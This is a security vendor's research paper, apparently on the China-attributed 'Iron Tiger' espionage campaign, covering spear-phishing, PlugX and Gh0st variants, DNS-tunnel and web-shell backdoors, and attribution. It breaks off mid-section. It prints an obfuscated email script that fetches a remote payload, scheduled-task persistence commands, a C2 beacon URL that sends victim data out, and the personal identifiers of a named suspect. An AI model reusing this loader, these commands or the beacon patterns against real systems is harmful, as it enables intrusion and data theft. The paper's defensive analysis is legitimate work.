{
    "title": "2015_12_wp_operation_iron_tiger",
    "text": "A TrendLabsSM Research Paper\nOperation Iron Tiger:\nExploring Chinese Cyber-Espionage \nAttacks on United States Defense Contractors\nZiv Chang, Kenney Lu, Aaron Luo, Cedric Pernet, Jay Yaneza \n(Trend Micro Cybersafety Solutions Team)TREND MICRO LEGAL DISCLAIMER\nThe information provided herein is for general information \nand educational purposes only. It is not intended and \nshould not be construed to constitute legal advice. The \ninformation contained herein may not be applicable to all \nsituations and may not reflect the most current situation. \nNothing contained herein should be relied on or acted upon \nwithout the benefit of legal advice based on the particular \nfacts and circumstances presented and nothing herein \nshould be construed otherwise. Trend Micro reserves the \nright to modify the contents of this document at any time \nwithout prior notice.\nTranslations of any material into other languages are \nintended solely as a convenience. Translation accuracy is \nnot guaranteed nor implied. If any questions arise related \nto the accuracy of a translation, please refer to the \noriginal language official version of the document. Any \ndiscrepancies or differences created in the translation are \nnot binding and have no legal effect for compliance or \nenforcement purposes.\nAlthough Trend Micro uses reasonable efforts to include \naccurate and up-to-date information herein, Trend Micro \nmakes no warranties or representations of any kind as \nto its accuracy, currency, or completeness. You agree that access to and use of and reliance on this document \nand the content thereof is at your own risk. Trend Micro \ndisclaims all warranties of any kind, express or implied. \nNeither Trend Micro nor any party involved in creating, \nproducing, or delivering this document shall be liable \nfor any consequence, loss, or damage, including direct, \nindirect, special, consequential, loss of business profits, \nor special damages, whatsoever arising out of access to, \nuse of, or inability to use, or in connection with the use of \nthis document, or any errors or omissions in the content thereof. Use of this information constitutes acceptance for \nuse in an “as is” condition.Contents\nTargets: From Asia-Pacific to \nthe US4\nActors: Tracing the operation’s Chinese roots8\nOperation: Iron Tiger hacks targets’ defenses11\nMitigation: Combating cyber espionage and targeted attacks51If a single piece of valuable information can put a nation at a disadvantage, what could much \nmore stolen data do? A group of China-based threat actors known as “Emissary Panda1” \nor “Threat Group-3390 (TG-3390)2” may know the answer, as they have been seen stealing \nterabytes of confidential data from employees of high-technology companies in the United States (US) since 2013.\nTheir target? Government defense contractors and related companies. They specifically \ntargeted the directors and managers of US companies in the electric, aerospace, intelligence, telecommunications, energy, and nuclear engineering industries, among others. Looking at the targets, we believe the attackers constantly monitored technology-inclined US government contractors.\nIn a cyber-espionage operation we dubbed “Iron Tiger,” the actors first spent years spying on \npolitical targets and government agencies in China, Hong Kong, and the Philippines back in 2010 before eyeing technology-related organizations in the US. Given the huge geographical shift in target, it is very likely that Iron Tiger is only part of a bigger campaign where specific targets are assigned to various teams.\nThe actors have stolen emails, full Active Directory® dumps, intellectual property, strategic \nplanning documents, and budget- or finance-related content—all of which can be used to sabotage target governments’ or private organizations’ plans. We’ve even seen them nab up to 58GB worth of data from a single target. They could have even stolen terabytes of data in total.\nWe found convincing evidence pointing to China as the threat actors’ primary location. \nThese indicators include the use of virtual private network (VPN) servers that only accepted China-based registrants, Chinese file names and passwords, and China-registered domains. Specifically following two virtual aliases, “phpxss” and “ershao,” we were able to attribute operational activities to a key personality physically located in China.\nNote that the actors are skilled in launching digital attacks. They not only followed new \nmalware-creation tool releases but also used customized tools like dnstunserver and abused legitimate services like Blogspot™ and the Google Cloud Platform™. Using legitimate services allowed them to evade monitoring and efficiently change command-and-control (C&C) servers in case of discovery.\nWhile their techniques may be quite advanced, they adapt to their target networks’ security \nlevels and sparingly used sophisticated methods. Like any organized and motivated team, they exerted minimal effort to achieve maximum results.4 | Operation Iron Tiger\nQuality trumps quantity as far as Iron Tiger goes. It targets fewer individuals and organizations compared \nwith other campaigns like Russia-based cyber-espionage operation, Pawn Storm3. Yet like Pawn Storm, \nIron Tiger also spies on organizations where they are based.\nChina  — 2010\nEducation\nPhilippines  — 2010\nGovernmentHong Kong  — 2010\nOthers (political organizations)\nTibet — 2010\nOthers (political organizations)\nUnited States  — 2013\nTechnology\nUnited States  — 2013\nEnergyUnited States  — 2013\nTelecommunications\nUnited States  — 2013\nManufacturing\nGlobal distribution of Iron Tiger’s targets\nThe actors first monitored targets in the education industry in China, political dissidents in Hong Kong, \ngovernment agencies in the Philippines, and political targets in Tibet as far back as 2010. We believe individual targets from each country were picked to gather inside information on political events that prevailed at the time.\nThe actors use spear-phishing email subjects that would be interesting to their chosen targets. They used \n“Han Zheng stays at Regent Pan—Housing protest held in advance” as lure to entice curious political targets to join a protest against then-mayor of Shanghai\n4. Other subjects exposed the attackers’ aim to \ntarget very important persons (VIPs), engineers, and/or public relations (PR) or communication officers.Targets: From Asia-Pacific to the US5 | Operation Iron Tiger\nSample spear-phishing email sent to targets (subject in English, “Han Zheng stays at Regent Pan—\nHousing protest held in advance”)\nIn 2013, Iron Tiger’s targets changed. After achieving cyberspying feats, the attackers set out to catch \nbigger fish—individuals in defense- and technology-related fields like aerospace, energy, intelligence, nuclear engineering, and telecommunications. Looking at the targets, we believe the attackers constantly monitored high-technology contractors of the US government.\nUp to terabytes of stolen data\nThe actors are believed to have stolen up to terabytes of data, given the sheer amount of information they gathered from each target. They were able to extract as much as 58GB worth of data from a single organization. This was even more than the 40GB worth of data initially leaked after the Sony Pictures hack, which exposed unreleased films, personal employee files, medical records, and others.\n5\n6 | Operation Iron Tiger\nTypes of data stolen by the Iron Tiger actorsStrategic planning\ndocumentsBudget-/Finance-\nrelated contentFull Active\nDirectory dumpsEmails\nIntellectual\nproperty\nActual content found inside a 58GB archive \nstolen from a single target organizationA compromised Microsoft® Exchange™ server showed that Iron Tiger uses various exfiltration routines. They install two different backdoors—BKDR_PLUGX.XXT and Dllshellexc2010 (which specifically affects Microsoft Exchange). They rename files prior to extraction using extensions like .CSS to bypass security protections put in place for archived files (.ZIP, .7z, .RAR, etc.).\nContent of a .7z file named “txt.css” generated by the attackers on a compromised network7 | Operation Iron Tiger\nThe actors also use Robocopy, an application that lets users remotely copy files to local hard drives in \norder to extract them from a server. Finally, they export mailboxes to a .PST file using the “Export-Mailbox” PowerShell command. Data meant to be stolen is always stored as encrypted .7z files in the Microsoft Outlook® Web App (OWA) folder.\nWith all of the files in their hands, the actors may know \neverything about the network and its users, making lateral movement possible. The possibilities are endless. At this point, they obtain the highest privilege levels on the compromised network.8 | Operation Iron Tiger\nThe following pieces of evidence revealed that the Iron Tiger actors can be Chinese-speaking individuals \nproficient in computer security and launching digital attacks:\n•\n The VPN servers were mostly located in China like those provided by BAIGE VPN.\n•\n The file names and passwords used were Chinese.\n•\n Some text resources and language IDs used in malware binaries were set to simplified Chinese.\n•\n HUC Packet Transmit Tool (HTran) is frequently used by Chinese threat actors.\n•\n Whois data revealed that related domains like shangxian.info were registered with physical \naddresses in China.\n•\n The other related resources (QQ, Lofter, 163.com) are popularly used in China.\nIs “Fei” behind Iron Tiger?\nFollowing virtual aliases related to Iron Tiger allowed us to attribute operational activities to a key \npersonality—Guo Fei—who resides in Shanghai, China.\nPhpxss and exenull\nThe systematic use of these two nicknames, their use of the same password to encrypt files, and the way they accessed C&C servers made us believe that only a few key individuals rather than a huge group of people were behind the campaign. Phpxss was probably a reference to cross-site scripting (XSS) vulnerabilities based on PHP. This choice of nickname made us believe that the actor had ties to traditional cybercrime.\nPhpxss had ties to xssok.blogspot.com and phpxss.lofter.com —C&C servers for three Trojans (dnstunnel, \nNBDDOS, and PlugX) related to Iron Tiger. The malicious tool, dnstunclient, accesses xssok.blogspot.\ncom to know what the controlling IP address is. A Gh0st variant, meanwhile, accesses phpxss.lofter.com, \nwhich leads to a C&C server.Phpxss also serves as username for several email addresses from different free email providers and the \nBAIGE-VPN-provided service. One of the subdomains under shangxian.info that points to a C&C server \nhas also been registered with the name, “php xss,” and the email address, [REDACTED]s\n \n@\n gmail\n \n.\n com.Actors: Tracing the operation’s Chinese \nroots9 | Operation Iron Tiger\nRegistrant Email: [REDACTED]s  @  gmail  .  com\nRegistrant Name: php xss \nRegistrant Organization: Registrant Street: shanghairoad Registrant City: shanghai Registrant State/Province: sldkkk Registrant Postal Code: 200000 Registrant Country: CN Registrant Phone: +86.[REDACTED]53232\nWhois information tied to shangxian.info and registered by php xss\nWe also found a blog comment with the name, “phpxss,” which led to an email address; a QQ number \n(693149); and the name, “Guo Fei.” Additional research on the QQ number led us to a person named  \n“郭飞,” which translates to “Guo Fei.” The name, “exenull,” meanwhile, was used by the same person to register on target sites or forums.\nComment by phpxss linked to a Gmail account and QQ number owned by Guo Fei\nPhpxss’s geographical information10 | Operation Iron Tiger\nQQ Insight Labs overview of the QQ number, “693149”\nMore information on the QQ number, “693149”\nErshao and myershao\nErshao and myershao were other nicknames tied to the name, “Guo Fei.” These were found in leaked \nunderground forum databases and had ties to the same QQ number that phpxss used. A related email address found in underground forums, [REDACTED]o\n @\n \nlive\n .\n \ncn, was also used to register the domain, \nmai1.info, which had ties to Iron Tiger.11 | Operation Iron Tiger\nOperation: Iron Tiger hacks targets’ \ndefenses\nThe Iron Tiger actors can be skilled computer security experts but sparingly used advanced techniques, \ngiven their weakly protected target networks. They do not follow a specific schedule when it came to launching attacks. Instead, they prioritize attacks based on a list of chosen targets. We have, for instance, seen them dump the contents of a company’s Active Directory database nine months prior to actual data exfiltration.\n2010\n2015\n20162014201320122011IIS exploit binaries (CVE-2008-1436)\nGTalkTrojan\nHTTPBrowser\nNBDDOS\nDnstunclient\nGoogle Cloud Platform TrojanQuarksPwDump\ns.exe\nDllshellexc2010\nPlugX\nRing RAT\nPlugX\nMalware and tools that Iron Tiger used sorted by compilation date\nInvestigations revealed several Iron Tiger-specific routines. The actors are fond of using customized \nhacking tools like dnstunserver and known targeted attack malware, PlugX and Gh0st variants, to remotely access target networks.\nThe attackers abuse free Web services to accomplish their goals. They set up C&C servers in the free \nblogging platform, Blogspot; connected a Gh0st variant to the Chinese blogging platform, Lofter; and 12 | Operation Iron Tiger\ncreated email accounts in Gmail™ and Microsoft Outlook. They also maintain a clean and controlled \ncommand center, going as far as patching one of the C&C servers they compromised and running the WebShellKill backdoor finder on it to keep cybercriminals or script kiddies away.\nWhen laterally moving inside networks, they use a stolen code-signing certificate from Korea-based \nsecurity company, SoftCamp Co., Ltd., to evade security solutions. To get deeper into networks, they intercept Microsoft Exchange™ credentials using Robocopy and the “Export-Mailbox” PowerShell command—both unique means. They also use a Trojan that was specifically designed to only work on the Google Cloud Platform.\nSpear phishing\nThe Iron Tiger actors likely gather solid information about organizations they want to infiltrate before zeroing in on specific figure heads. Quick Web searches on how specific organizations formulate email addresses can give them clues on target individuals’ specific addresses. Using these addresses, the attackers have been sending spear-phishing emails to compromise computers in target networks as early as April 2010.\nThe target individuals have varying professional classes, ranging from company executives and \ngovernment officials to engineers and PR officers. Some of their addresses can be easily found on the Internet. Others are not publicly available, which shows that the attackers have a certain level of maturity in reconnaissance or data gathering.\nThe actors use two addresses to send spear-phishing emails. One of these has been in use since 2010. \nThis is surprising, given that threat actors typically drop email addresses after a short period of time in order to evade detection. This can be a reflection of their confidence that their spear-phishing campaigns will stay undetected regardless.\nThe “From” field in messages sent via both addresses is usually modified to reflect the spear-phishing \nscheme used for a given target. The attackers often use names that pique the targets’ interests (affiliated with news agencies like the British Broadcasting Corporation [BBC] or the Agence France-Presse [AFP]).\nSubjects ranging from the generic to the more professional or personal are also used. Samples include \n“Shanghai mayor Han Zheng visits Taipei to promote World Expo,” “Han Zheng stays at Regent Pan—Housing protest held in advance,” and “Sino-US cooperation on maritime security seminar 13 | Operation Iron Tiger\nneighborhoods.”\nDate Industry (based on \nrecipient)Subject Translation\n25 November 2009 Others How about your \nparents?Not applicable\n3 April 2010 Communications and mediaSmurfs, Bollywood give Shanghai Expo star powerNot applicable\n3 April 2010 Others (political organizations)Hong Kong lawmakers give lukewarm response to Shanghai Expo tripNot applicable\n6 April 2010 Others (political organizations)上海市長韓正訪問台北推廣世博Shanghai mayor Han Zheng visits Taipei to promote World Expo\n6 April 2010 Others (political organizations)韓正下榻晶華 綠營提前住房抗議Han Zheng stays at Regent Pan—Housing protest held in advance\n7 April 2010 Education 关于中美海上安全合作讲座求教Sino-US cooperation on maritime security seminar neighborhoods\n7 April 2010 Education 征询 Consultation\n10 April 2010 Others (political organizations)Tashi Delek after long time! (Note that “Tashi Delek” is a Tibetan form of greeting that is usually translated to “Blessings and good luck.”)Not applicable\n16 April 2010 Government 2010年度部级法学研究课题申报公告Research ministerial declaration of the “2010 Law Bulletin”\n9 July 2010 Government Forging a US-Brazil strategic partnershipNot applicable\n9 July 2010 Government Brazil’s new security strategy and defense doctrineNot applicable\n10 July 2010 Others (political organizations)FW: Tuesday’s meeting at 10 is cancelledNot applicable\n10 July 2010 Others (political organizations)FW: Can we meet to discuss your coming trip?Not applicable\n10 July 2010 Others (political organizations)RE: Staff meeting is Wednesday at 14:00Not applicable14 | Operation Iron Tiger\nDate Industry (based on \nrecipient)Subject Translation\n10 July 2010 Others (political \norganizations)The minutes from last week’s board meetingNot applicable\n14 July 2010 Education Homeland Security and DefenseNot applicable\n3 August 2010 Government 您好，我是刚毕业的，投简历一份，希望有幸成为贵公司一员Hello, I just graduated, attached is my resume, hoping to get the opportunity to be part of your company\n5 August 2010 Others (political organizations)Will you come? Not applicable\n5 August 2010 Manufacturing Summit on nuclear safety issues discussedNot applicable\n17 August 2010 Others (political \norganizations)How about recent days? Not applicable\n6 September 2010 Manufacturing, \ntechnology, others (nonprofit organizations)2010 Sandia nuclear weapons research topicNot applicable\n10 September 2010 Others (political \norganizations)警告钓鱼岛挑衅者，希望不要把中国的愤怒点燃Warning Diaoyu provocateurs, hoping not to ignite China’s ire\n25 January 2011 Others Backup (Note that this was sent by “Admin.”)Not applicable\n23 April 2013 Government The new foreign policy frontierNot applicable\n23 April 2013 Government Economic development and reconstructionNot applicable\n23 April 2013 Government Taiwan’s response to an evolving security environmentNot applicable\n23 April 2013 Government Taiwan Not applicable\n25 April 2013 Government Taiwan’s response to an securityNot applicable\n9 May 2014 Government The future of the US Army Officer CorpsNot applicable\n9 May 2014 Government Illicit international activitiesNot applicable\n5 September 2014 Telecommunications, \ntechnology#COMPANYNAME# jobs! Help me! Help me!Not applicable\n12 October 2014 Telecommunications 佘氏论坛改版需求 Forum needs revision\nMore spear-phishing email subjects used in Iron Tiger15 | Operation Iron Tiger\nThe spear-phishing emails had limited content, usually only one or two lines of text. They came with \narchive file attachments (usually .RAR files) that contained malicious .EXE files.\nEmail source code that shows the HTML content, including the Web bugSample Iron Tiger spear-phishing email\nThe email above had a hidden image, which was actually a “Web bug” that allowed attackers to get \nmore information from target systems like IP addresses, browser versions, and others. Some emails had slightly obfuscated code. When deobfuscated, the code tries to run a remote script. We were, unfortunately, unable to retrieve the said js.php script.16 | Operation Iron Tiger\nSlightly obfuscated code in an Iron Tiger email<div id=”code” title=”emailkey=’##REDACTED##’;window.onerror=function(){return \ntrue;};if(window.ufoufoufo!=1){framedir=’http://’;framedir=framedir+’##REDACTED-IPADDRESS##:2687/h/’;yyuser=’##REDACTED E-MAIL ADDRESS##’;_x_=document.createElement(‘SCRIPT’);_x_.src=framedir+’/js.php?key=’+emailkey+’&msg=’+escape(‘-’+yyuser+’^-!!-’+document.location);document.insertBefore(_x_,document.getElementsByTagName(‘*’)[0]);ufoufoufo=1;}”></div><style> p,font,table{ top:rgb(‘88’,80,’180); top:rgb(‘) !important height:expression(  (window.r==123)?x=8:(eval(code.title)==20088) || (r=123)       )    }’,80,’180); } </style> <p>-</p><font>-</font>\nhttp://##REDACTED IP ADDRESS:2687/h/js.php?key=##REDACTED##&msg=-##REDACTED E-MAIL ADDRESS##^-!!-document.location\nDecoded version of the slightly obfuscated code\nArsenal\nWhile the malware and tools that the actors used were publicly available, some were not at the time this \npaper was written.\nDnstunclient\nDnstunclient was named after strings found inside its binary (SHA-1: \nafce5e56fc9bd1774d0cbbab1df205d0152fc632, detected by Trend Micro as HKTL_DNSTunnel). This \nhas an interesting way of communicating with the attackers and finding C&C servers. It fetches the home page of a blog, xssok.blogspot.com, with information on how to reach a C&C server. Contacting the blog \nwas registered as a scheduled task on a compromised system, which runs every Sunday at 8:00 A.M. (matching the infected system’s time zone) and fetches the Blogspot page.17 | Operation Iron Tiger\nHome page of xssok.blogspot.com\nC:\\Windows\\System32\\cmd.exe /C schtasks /create /tn “Microsoft Windows” /tr \n[FILE NAME] /sc weekly /d SUN /st 08:00:00 /ru System”\nCode that set when compromised systems should access the blog\nFormat:   “$$$$$$$$$$[Day OF Week]#####[DNS or IP]$$$$$$$$$$”  Example: “$$$$$$$$$$SUN#####10.10.10.10$$$$$$$$$$”\nFormat used to provide dnstunclient with a C&C server’s IP address\nOn Windows Vista or newer systems, the scheduled task is registered as shown below.\nC:\\Windows\\System32\\cmd.exe /C schtasks /create /tn “\\Microsoft\\Windows\\PLA\\\nSystem\\Microsoft Windows” /tr [FILE NAME]  /sc weekly /d SUN /st 08:00:00 /ru System”\nScheduled task code on Windows Vista or newer systems\nRunning the scheduled task decodes the information provided by the blog so the system can access the \nactual C&C server. A reverse command shell then runs using the Domain Name System (DNS) protocol with CNAME and A queries on User Datagram Protocol (UDP) port 53.18 | Operation Iron Tiger\nDNS protocol used as communication channel by a malware variant\nThe said malware is Base64 encrypted and so can easily be decrypted. Further analysis of the binary \nrevealed that it was a command-line tool that was modified to work on its own. Its original version can be used with arguments like:\n•\tdnstunclient -ip <server ip address>\n•\tdnstunclient -d or -domain <domain>\nThe modified version, meanwhile, forced the use of xssok.blogspot.com.\nv5 = (int *)argv; \n  *argv = aAaa;   argv[1] = aIp_0;  //Set argument 1 to –ip   v6 = (const char *)sub_402A40(); //get C2 server ip from blog   argv[2] = v6; //Set argument 2 to C2 server ip\nModified tool code that forces the use of xssok.blogspot.com instead of arguments\nReverse engineering allowed us to see the tool’s original output. The original dnstunclient is a console \nprogram that can be used for temporary lateral movement but it has been modified to act as a Trojan. The modified tool adds extra functions to replace or add parameters while the original always read parameters from the console input. As such, the modified tool grabs parameters from a remote Web page.19 | Operation Iron Tiger\nSample output of the original dnstunclient tool\nThe “wzrapbia” string the modified tool creates is automatically generated but can’t be used as an \nindicator of compromise (IoC).\nOver the past year, Iron Tiger increasingly used similar channels to communicate—an obvious attempt at \nstaying undetected. Log file reviewers will probably classify Blogspot-related requests as legitimate but dnstunclient still only accesses xssok.blogspot.com once a week as a precautionary measure.\nWe monitored xssok.blogspot.com for C&C changes for several months but saw very few modifications. \nThe blog, for instance, moved twice to an internal IP address (192.168.[REDACTED]) before switching \nagain to a compromised server owned by an Asian academic institution.\nDnstunserver\nDnstunserver is not available anywhere online, even on underground forums. It was most likely \ndeveloped or bought for Iron Tiger’s exclusive use.\nThe binary (SHA-1: eeec12cb0dcc7c77a4ecee9facd2ccc1f3e2d93c, detected by Trend Micro as HKTL_\nDNSTunnel) was compiled just this February. It is dnstunclient’s server part. When launched, it opens \na fake DNS service on UDP port 53 and waits for connections from victims. When a connection is established, dnstunserver provides a remote shell that allows the attackers to execute commands on infected computers.\nDnstunserver’s server part has interesting debug information like the following paths with Chinese words \nformed using the Guojia Biaozhun (GB2312) character set, the “national standard” (Note that “ 桌面” \ntranslates to “desktop.”):\n•\tC:\\Documents and Settings\\Administrator\\ 桌面\\dns control\\t-DNSTunnel\\DnsTunServer\\dns.cpp\n•\tC:\\Documents and Settings\\Administrator\\ 桌面\\dns control\\t-DNSTunnel\\DnsTunServer\\\nDnsTunServer.cpp\n•\tC:\\Documents and Settings\\Administrator\\ 桌面\\dns control\\t-DNSTunnel\\DnsTunServer\\\n20 | Operation Iron Tiger\nmemory.cpp\n•\tC:\\Documents and Settings\\Administrator\\ 桌面\\dns control\\t-DNSTunnel\\DnsTunServer\\socket.\ncpp\nExchange backdoor + WebShell = Dllshellexc2010\nIron Tiger uses a backdoor called “Dllshellexc2010” by its author on a Microsoft Exchange server that \nbelongs to a target. Dllshellexc2010 is a tool customized for the attackers’ exclusive use. It is a .NET module (SHA-1: 08afa64b23288c0414b379cb4e67c1a8dabea033 ), a very small dynamic link library \n(DLL) (less than 8kB in size) that can be installed on Microsoft Exchange or Internet Information Services (IIS) servers for the purpose of stealing users’ authentication credentials while logging in. It provides a WebShell to the machine, in addition to credential-stealing capabilities.\nc:\\Users\\ljw\\Documents\\prj\\dllshell\\Dllshell\\Dllshellexc2010\\obj\\Release\\\nMicrosoft.Exchange.Clients.Auth.pdb\nDebug string found in Dllshellexc2010’s binary\nWebShell that Dllshellexc2010 provides\nThe WebShell does not require any physical ASP.NET file to be present in the IIS directory. It runs \nevery time an HTTP request to any path ending with “x.aspx” is sent. It creates a temporary file called \n“8xla90ssz7693.tmp” with a tiny WebShell in the %TEMP% folder, which is later executed.\nDllshellexc2010’s source code shows that it extracts a parameter called “chopper” when executed, just \nlike the infamous WebShell, 中國菜刀 or China Chopper6. We believe this DLL was created by someone \nvery familiar with China Chopper. We decided to test it in a controlled China Chopper environment 21 | Operation Iron Tiger\nand found that it worked perfectly. Dllshellexc2010 also intercepts Microsoft Exchange credentials \nevery time a request path that contains “/auth.owa,” a default log-in path for OWA, is used. Note the \nuse of Chinese in the log file generated. Intercepted credentials are written to a hard-coded file called “%TEMP%\\~4DAF8B\\~P486.jpg” on the infected system’s disk. It uses the .JPG extension even though it is actually a text file.\nWebShell that Dllshellexc2010 provides inside the China Chopper graphical user interface (GUI)\nCode used to log usernames and passwords\nStolen credentials are written to %TEMP%\\~4DAF8B\\~P486.jpg22 | Operation Iron Tiger\nSample result of Dllshellexc2010’s credential-stealing capability\nAttacker’s browsing history and related tools\nWe were able to examine the browsing history of a C&C server that the actors compromised and saw how \nthey quietly accessed parts of their arsenal (malware and tools) that was hosted elsewhere online. They stored a lot of their usual tools on a mac.pm server, which was hosted in the US and whose name servers \nare known for having ties to malware-related activities.\nURL SHA-1 Description\n/file/dump.7z Unknown Was not retrieved but is likely a \nGSecDump tool\n/file/7z.exe Legitimate file Legitimate .7z compressor\n/tool/dnser.exe eeec12cb0dcc7c77a4ecee9facd2ccc1f3e2d93c or \nHKTL_DNSTunnelDnstunserver file\n/tool/wce.exe Legitimate file Legitimate Windows Credential Editor file\n/tool/ghost.rar ec0c179903e413490cec41c522ba612737d38c4a Contains Gh0st server Ring.exe \nvariant\nFiles downloaded by the attackers onto mac.pm\nThe attackers download a mixture of legitimate and malicious tools, including a famous Windows \nCredential Editor password dumper, GSecDump, and a .7z compressor.\nDnstunserver is also stored on mac.pm, together with a .RAR file that can contain Ring.exe, a Gh0st \nremote access tool (RAT) variant.The actors also download files that belong to a private South Korean company (whose name we do not \nwish to disclose) from a compromised domain.\nURL SHA-1 Description\n/webnote/upload/\ntest/3f.7z1f8dec3ea9b25de862a11b4d807f0d8de00c7972 PlugX Server 3.0: EFH3.exe, \nFastDos.exe, FastGui.exe, FastProxy.exe\n/webnote/upload/int.rarac6ee2d9cadf5415ad85f7cb756d6c46022a5ecf Cracked version of Internet \nDownload Manager\nFiles downloaded from a compromised private South Korean company’s site\n23 | Operation Iron Tiger\nThe files in the table on the previous page have since been removed. One of the target organizations must \nhave cleaned its Web server.\n3f.7z, a file downloaded from a compromised server, was encrypted with an unknown password. We were \nunable to decrypt it but were able to list its contents. The same files related to the PlugX or KorPlug RAT \nwere found on the C&C server. These were likely the contents of 3f.7z.\nWebShellKill\nThe Iron Tiger actors downloaded a Chinese tool called “WebShellKill,” which is publicly available. They \nuse an old version (V1.4.1) of the tool even if V1.7.2 was already available at the time this paper was written.\nWebShellKill features as advertised by its author\nIt may be puzzling to find WebShellKill on attackers’ servers because it is used to find backdoors in code \n(PHP, ASP, VBS, etc.). But since attackers generally plant backdoors anywhere, why would they want to remove them?\nWe quite easily found the answer when we saw the actors compromise a server and immediately launch \nthe tool. The server they chose had several backdoors, which they got rid of via WebShellKill. They probably wanted to make sure the compromised server was clean and could not be easily accessed by script kiddies or even cyberdefenders.24 | Operation Iron Tiger\nGoogle Cloud Platform Trojan\nThe Iron Tiger actors bought a Trojan that \nonly worked on the Google Cloud Platform. Its C&C server accesses an appspot.com domain. \nWe found a version of the Trojan’s server-side component that was coded in Python. Note that using Python for coding Trojans is unusual. We also found a file called “app.yaml,” which was \nthe Trojan’s configuration file.The Iron Tiger actors seem to really care about not being \nhacked. They went so far as patching a compromised C&C server by logging in as administrator and deploying security fixes.\nClient or server options that the Google Cloud \nPlatform Trojan uses\nURL Function Affected party\n/user Accesses servers when online Victims\n/userlist Dumps all available clients Attackers\n/client Checks server status (on standby \nor working)Victims\n/server Turns server on and/or off Attackers\n/data Starts subcommands (pr, fi, sh, dir, or uninstall)Victims and attackers\n/pr Lists or kills running processes Victims and attackers\n/fi Uploads or downloads files Victims and attackers\n/sh Executes commands Victims and attackers\n/dir Lists directory contents Victims and attackers\nGoogle Cloud Platform Trojan’s functions\nThe Trojan was installed on 13 machines that belong to a target company most likely for lateral \nmovement. We also found a variant of its client part that was compiled on 23 March 2015. The sample is named “svchost.exe,” a supposed key Microsoft Windows component. When launched, the binary tries to \nestablish persistence by adding a “Run” registry key named “iisini” to execute the file.25 | Operation Iron Tiger\nClient-side properties of the Google Cloud \nPlatform Trojan\nCode that creates a persistence registry key on infected systemsThe Trojan then accesses a C&C server by sending the HTTP GET request, hxxp://exenull1.\nappspot.com/user?pid=XXXXX&data=XXXXX. It probably tracks victims via unique transmit PIDs generated on infected computers. The data parameter had a Base64-encoded string that, when decoded, contains “IP address!Username!Company.” The Trojan’s User-Agent was “WinHTTP Example/1.0” and was likely created for the actors’ exclusive use.\nMalware\nThe Iron Tiger actors use three different RATs \ncommonly associated with targeted attacks originating from China.\nBKDR_PLUGX\nPlugX\n7, also known as “Sogu,” “Gulpix,” or “KorPlug,” has been used as a RAT in several targeted attack \ncampaigns. Its author8 or a developer with access to its source code has been updating it on a regular \nbasis.26 | Operation Iron Tiger\nPlugX variants use the DLL side-loading method to infect target computers. DLL side-loading involves \nabusing a legitimate Windows executable file to load a malicious DLL (PlugX) instead of a legitimate library. All this requires is naming the malicious binary the same as the DLL that attackers wish to execute. PlugX is then loaded instead of the legitimate library in a system folder.\nSample PlugX attack scenario\nThe actors used the method above to infect computers aided by legitimate binaries from \nMicrosoft or antivirus companies like Symantec and F-Secure. We have seen them use a Microsoft-signed binary, Form.exe. This was dropped, along with two other files, FormDll.\ndll (SHA-1: 4df17c9e64f7277538141e384d4a372c60787f1a ) and Form.hlp (SHA-1: \nd3fb95d0eeccd99c475c6b985a6c911bed69f50d ). FormDll.dll contained all of the malicious code while \nForm.hlp had the main malware binary and configuration. When the legitimate Form.exe is launched, \nPlugX:\n•\n Copies three components to C:\\Windows\\System32\n•\n Sets the files’ attributes to “hidden” and “system”\n•\n Sets the files’ time stamps to “2008/04/14”\n•\n Creates the service, “Microsoft .Net Framework NGEN 4.0”\n•\n Starts a zombie process called “svchost.exe” and injects code\n•\n Removes itself from infected systems27 | Operation Iron Tiger\nPlugX infection as seen in the Windows registry\nPlugX files hidden in system32\nPlugX SController 3.0\nSController 3.0 is the internal name of some variants of the PlugX server-side binary. Its GUI, \nmeanwhile, is called “PureICE.” PureICE’s Users panel provides a lot of information about infected machines, including:\n•\n Computer name\n•\n Local area network (LAN) IP\n•\n Wireless LAN (WLAN) IP\n•\n Location\n•\n Protocol\n•\n OS\n•\n Languages•\n Memo\n•\n CPU\n•\n Memory\n•\n Screen resolution\n•\n Last online time\n•\n Version\n•\n CLSID\nT\nitle bar of a PlugX server-side binary\nThe panel also groups infected machines based \non user definition though a default group name is always present, “U.S.A.”\nDefault group name configured in PureICE28 | Operation Iron Tiger\nThe second panel, Listeners, shows the server settings. It supports Transmission Control Protocol (TCP) \nand UDP. Note that TCP can accept HTTP or raw TCP transmissions at the same time. Clicking the infected machines’ icons shows the Manager panel.\nPureICE’s Listener panel’s list of running infected machines\nPureICE’s Manager panel\nPureICE’s GUI had English spelling mistakes. Some features did not even use English, only Chinese. \nPureICE’s Manager panel had various functions, including:\n• Disk (file manager)\n•\n NetHood manager\n•\n File transfer•  Processes (process manager)\n•\n Services manager\n•\n RegEdit (registry editor)29 | Operation Iron Tiger\n• Netstat manager\n•\n Capture (screenshot manager)\n•\n Control (a kind of Remote Desktop Protocol \n[RDP] manager)\n•\n Shell (remote shell)\n•\n Telnet (not a Telnet manager but a DOS emulator)•\n  PortMap (port-mapping, SOCKS4, or SOCKS5 manager)\n•\n SQL (connects to any database via Open Database Connectivity [ODBC])\n•\n Keylogger manager\n•\n Option (lock, log off, restart, or shut down with message customization)\nPlugX has, to our knowledge, never been used by non-Chinese attackers, once again strengthening our \nassumption that Iron Tiger hails from China.\nGh0s\nt variants\nWe found several variants of the infamous Gh0st RAT used in Iron Tiger as well.S.exe\nOne of the Gh0st variants, s.exe (SHA-1: \n7b34f24703b5415bc46fdab3801ac79e3e82242a ) \nhas a lot of obfuscation functions. While it is \nheavily encrypted, in memory, it is easier to see the infamous string, “Game Over Good Luck By Wind,” appear.\nUnobfuscated strings in the Gh0st variant found in memory S.exe was modified to evade antivirus detection. \nSome of its functions were also deactivated. It accesses the following C&C servers:\n•\tgameofthrones.ddns.net\n•\tuser.qzone.qq.com/1479457083\n•\tys168.com\nGameofthrones.ddns.net has been hosted in various countries since February 2015, including the US, \nVietnam, and South Korea. Interestingly, one of its domains always points to the IP address, chrome.\nservehttp.com. We have yet to gather samples accessing the said C&C server though.\nYs168.com is a dynamic DNS in the form, <username>.ys168.com. Ys168.com without the subdomain as \na C&C server could have been just a mistake on the attackers’ part. This did not have any effect, however, \nas s.exe could still access other C&C servers.30 | Operation Iron Tiger\nUser.qzone.qq.com/1479457083 was a static link that s.exe used to directly get a C&C server’s IP address \nfrom the Web page’s title. This page’s account has been suspended though.\nRing RAT\nRing RAT is the internal name of another \nIron Tiger-related Gh0st variant (SHA-1: d72ef43059ad0d5b4fc1e218e5257439ac006308 ) \ncompiled just this March. Two unique class names in Ring RAT’s binary— CGh0stDoc and \nCGh0stView—made it 